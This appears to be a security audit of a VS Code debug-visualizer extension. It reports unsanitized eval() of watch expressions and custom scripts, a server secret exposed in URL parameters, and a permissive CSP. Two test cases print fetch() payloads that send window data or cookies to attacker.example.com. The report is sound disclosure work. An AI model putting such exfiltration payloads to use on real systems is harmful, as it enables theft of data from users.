- **Vulnerability Name:** Arbitrary Code Execution via Unsanitized Watch Expression Evaluation  
  **Description:**  
  - The extension accepts “watch” expressions (for example, in the debug visualizer) and uses them to generate visualization data. In the process the supplied expression is wrapped in a JavaScript function and then passed directly to the built‑in `eval()` without any filtering.  
  - An attacker who can influence the watch expression (by intercepting or modifying debug session traffic, or via a compromised WebSocket connection) may include malicious JavaScript code that is subsequently executed in the context of the debug target.  
  **Impact:**  
  - This may lead to full compromise of the debuggee. Malicious code execution in the target process can result in exfiltration of sensitive data, further lateral attacks, or even complete system takeover if privileged interfaces are accessible.  
  **Vulnerability Rank:** Critical  
  **Currently Implemented Mitigations:**  
  - The design currently assumes that debug watch expressions are entered by a trusted user in a controlled debug environment and therefore does not apply any sanitization or sandboxing to the evaluated expression.  
  **Missing Mitigations:**  
  - No input validation, sanitization, or sandboxing is applied to the supplied watch expression.  
  - The extension should restrict the evaluation context or use safer evaluation mechanisms (for example, a restricted JavaScript interpreter).  
  **Preconditions:**  
  - An attacker must be in a position to modify or inject a watch expression—for example, by compromising the authenticated WebSocket connection used during a remote debug session or via other means of input injection.  
  **Source Code Analysis:**  
  - In the project’s data‐extraction API (for instance, in `/code/data-extraction/src/js/api/DataExtractorApiImpl.ts`), the API function `getData` receives a callback function that calls an evaluation helper (`evalFn(expr)`) without filtering the user‑supplied string.  
  - In the higher‑level Model (e.g. in `/code/webview/src/model/Model.ts`), the method `setExpression` takes a new expression, updates its state, and calls `server.setExpression({ newExpression })`—which later leads to an unsanitized evaluation via `eval()`.  
  **Security Test Case:**  
  1. Start a debug session in the extension and open the Debug Visualizer view.  
  2. Use the “Use Selection as Expression” command (or simulate an attacker intercepting the watch expression input) and supply a payload such as:  
     ```js
     (function(){ fetch("http://attacker.example.com/steal?data=" + encodeURIComponent(JSON.stringify(window))) })()
     ```  
  3. Trigger the evaluation of the watch expression.  
  4. Verify (using network monitoring or logging) that the malicious code is executed in the target context.

- **Vulnerability Name:** Exposure of Webview Server Secret via URL Query Parameters  
  **Description:**  
  - The webview server generates a random secret to authenticate incoming WebSocket connections. However, in the function that constructs the URL for the webview page (for example, in `/code/extension/src/webview/WebviewServer.ts` within the `getWebviewPageUrl` method), the secret is embedded as a query parameter.  
  - If an attacker intercepts the URL—via phishing, local network eavesdropping, or any means that exposes the URL—they can extract the secret and use it to impersonate an authorized client.  
  **Impact:**  
  - Possession of the secret allows unauthorized establishment of a WebSocket connection to the webview server. This, in turn, could enable the attacker to send commands (like setting a watch expression) and trigger arbitrary code execution via the unsanitized watch expression evaluation.  
  **Vulnerability Rank:** High  
  **Currently Implemented Mitigations:**  
  - The secret is randomly generated and validated on each incoming connection; however, it is still transmitted in clear text as part of the URL.  
  **Missing Mitigations:**  
  - Sensitive secrets should not be included in URL query parameters. A more secure design might use cookies with HTTP‑only flags or other in‑memory transmission mechanisms that do not expose secrets to potential observers.  
  **Preconditions:**  
  - The attacker must be able to obtain the URL used by the webview (for example, by intercepting network traffic or tricking the user into revealing it).  
  **Source Code Analysis:**  
  - In `/code/extension/src/webview/WebviewServer.ts`, the method `getWebviewPageUrl` builds a URL string by appending query parameters that include `serverSecret` alongside other settings such as port number, mode, and theme.  
  **Security Test Case:**  
  1. Launch the webview and capture its URL.  
  2. Extract the value for the `serverSecret` parameter.  
  3. Use a WebSocket client (or a script) with the extracted secret to attempt to establish a connection to the webview server.  
  4. Confirm that the connection is accepted and that commands (such as those to change the watch expression) can be sent.

- **Vulnerability Name:** Insecure Content Security Policy (CSP) in Webview  
  **Description:**  
  - The HTML served in the webview contains a very permissive Content Security Policy. For example, in the function `getDebugVisualizerWebviewHtml` (located in `/code/extension/src/webview/InternalWebviewManager.ts`), the generated meta tag includes directives such as:  
    ```
    default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; ...
    ```  
  - This overly broad policy permits inline scripts, dynamic code evaluation, and loading resources from any source, leaving the webview vulnerable to cross‑site scripting (XSS) attacks or injection of malicious scripts.  
  **Impact:**  
  - An attacker who can influence content loaded in the webview (by intercepting network requests or injecting code) may execute arbitrary JavaScript in the context of the extension. This can compromise debugging data, exfiltrate sensitive information, or contribute to further attacks on the host system.  
  **Vulnerability Rank:** High  
  **Currently Implemented Mitigations:**  
  - The webview is served from a local server and the bundled assets are loaded via relative paths. However, the CSP policy itself remains extremely permissive.  
  **Missing Mitigations:**  
  - A stricter, minimally scoped CSP that whitelists only the required domains and disallows inline scripts and `eval()` should be applied.  
  **Preconditions:**  
  - The attacker must be able to inject or manipulate content served to the webview, for example via network injection or a misconfigured resource.  
  **Source Code Analysis:**  
  - In `/code/extension/src/webview/InternalWebviewManager.ts`, the HTML template generated by `getDebugVisualizerWebviewHtml` includes a meta tag with a CSP that uses wildcard sources and enables both `'unsafe-inline'` and `'unsafe-eval'` for several directives.  
  **Security Test Case:**  
  1. Intercept the HTML response for the webview load and modify it to include an additional inline script tag that sends a request to an attacker‑controlled endpoint.  
  2. Load the modified webview and check for execution of the injected script (for example, by monitoring outgoing network requests).  
  3. Alternatively, simulate injection through a custom payload and observe whether the lax CSP permits the code to run.

- **Vulnerability Name:** Arbitrary Code Execution via Unsanitized Custom Visualizer Script Injection  
  **Description:**  
  - The extension allows users to specify custom visualizer script paths via the setting `debugVisualizer.customVisualizerScriptPaths`. Files at these paths are monitored (via a file watcher in `/code/extension/src/webview/WebviewConnection.ts`) and their contents are read and then transmitted to the webview. In the webview, the method `setCustomVisualizerScript` (in `/code/webview/src/model/Model.ts`) uses an `eval()` call to execute the file content inside a function wrapper.  
  - Because the file content (supplied by the configured script file) is interpolated directly into an evaluation string without any sanitization or sandboxing, an attacker who is able to modify this file (or influence the configuration to point to a malicious file) can inject arbitrary JavaScript into the webview.  
  **Impact:**  
  - This vulnerability enables arbitrary JavaScript code execution in the extension’s webview context. An attacker could leverage it to access sensitive debugging data, alter the visualizer’s behavior, or launch further attacks against the host system.  
  **Vulnerability Rank:** Critical  
  **Currently Implemented Mitigations:**  
  - The system assumes that paths provided to `debugVisualizer.customVisualizerScriptPaths` refer to trusted files on disk. A basic existence check is performed, and an error is shown if a file does not exist.  
  **Missing Mitigations:**  
  - There is no sanitization or validation of the contents of the custom script files. The extension uses a raw `eval()` call to execute these scripts without isolation or sandboxing.  
  - A safer approach might involve validating the script against a whitelist, using a secure sandboxed evaluator, or at least clearly warning users about the risks.  
  **Preconditions:**  
  - The attacker must be able to control or modify a file referenced in the custom visualizer script configuration. This might be achieved if the workspace folder is writable by an adversary or if the user is tricked into configuring a remote (and attacker‑controlled) file path.  
  **Source Code Analysis:**  
  - In `/code/webview/src/model/Model.ts`, the method handling the incoming WebSocket command `setCustomVisualizerScript` immediately calls:  
    ```js
    eval(`
      ((load) => {
        let fn = undefined;
        if (load) {
          const module = {};
          load(module);
          fn = module.exports;
        }
        setVisualizationModule(${JSON.stringify(id)}, fn);
      })(
        ${jsSource ? `function (module) { ${jsSource} }` : "undefined"}
      )
    `);
    ```  
    Here, the file content (contained in `jsSource`) is inserted directly (wrapped inside an inline function) and evaluated without any filtering.  
  **Security Test Case:**  
  1. In VS Code, add a custom visualizer script path by updating the user or workspace setting `debugVisualizer.customVisualizerScriptPaths` to point to a file under your control.  
  2. Create (or modify) the file so that it contains a malicious payload—for example:  
     ```js
     alert("Malicious visualizer executed!");
     // Or code that sends data to an external server:
     (function(){ fetch("http://attacker.example.com/steal?data=" + encodeURIComponent(document.cookie)); })();
     ```  
  3. Restart or trigger a refresh of the custom visualizer (for example, by changing the debug expression so that the file watcher re‑reads the file).  
  4. Observe (using a browser debugger or network monitor) that the malicious payload executes within the webview context.
